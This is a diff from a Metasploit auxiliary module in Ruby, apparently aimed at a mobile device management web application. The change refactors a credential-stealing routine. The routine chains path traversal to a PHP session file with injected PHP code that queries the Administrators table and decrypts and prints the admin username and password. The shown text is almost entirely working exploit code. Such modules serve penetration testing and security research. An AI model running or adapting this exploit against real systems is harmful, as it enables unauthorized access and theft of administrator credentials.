@@ -49,22 +49,26 @@ class Metasploit3 < Msf::Auxiliary
 			'method' => "HEAD",
 			'uri' => normalize_uri("#{target_uri.path}", "download.php"),
 			'headers' => {"Cookie" => "PHPSESSID=#{sess}"},
-		}) 
+		})
 		return sess,cmd
 	end
 
 	def get_creds(session_id,cmd_var)
-		
+		cmd  = '$pass=mdm_ExecuteSQLQuery('
+		cmd << '"SELECT UserName,Password FROM Administrators where AdministratorSAKey = 1"'
+		cmd << ',array(),false,-1,"","","",QUERY_TYPE_SELECT);'
+		cmd << 'echo "".$pass[0]["UserName"].":".mdm_DecryptData($pass[0]["Password"])."";'
+
 		res = send_request_cgi({
 			'method' => 'GET',
 			'uri' => normalize_uri("#{target_uri.path}", "DUSAP.php"),
 			'vars_get' => {
 				'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
-				cmd_var => '$pass=mdm_ExecuteSQLQuery("SELECT UserName,Password FROM Administrators where AdministratorSAKey = 1",array(),false,-1,"","","",QUERY_TYPE_SELECT);echo "".$pass[0]["UserName"].":".mdm_DecryptData($pass[0]["Password"])."";'
-			}	
+				cmd_var => cmd
+			}
 		})
 		creds = res.body.to_s.match(/.*:"(.*)";.*";/)[1]
-		return creds.split(":")			
+		return creds.split(":")
 	end
 
 	def run_host(ip)
